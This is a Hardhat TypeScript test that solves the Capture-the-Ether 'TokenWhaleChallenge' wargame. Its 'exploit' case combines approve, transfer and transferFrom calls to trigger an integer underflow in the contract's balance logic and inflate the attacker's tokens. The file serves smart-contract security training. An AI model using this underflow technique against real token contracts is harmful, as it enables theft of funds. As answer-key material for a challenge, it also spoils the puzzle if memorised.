import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const approveTx = await target.connect(deployer).approve(attacker.address, 1000);
    await approveTx.wait();

    const transferTx = await target.connect(attacker).transfer(deployer.address, 501);
    await transferTx.wait();

    const transferFromTx = await target
      .connect(attacker)
      .transferFrom(deployer.address, "0x0000000000000000000000000000000000000000", 500);
    await transferFromTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
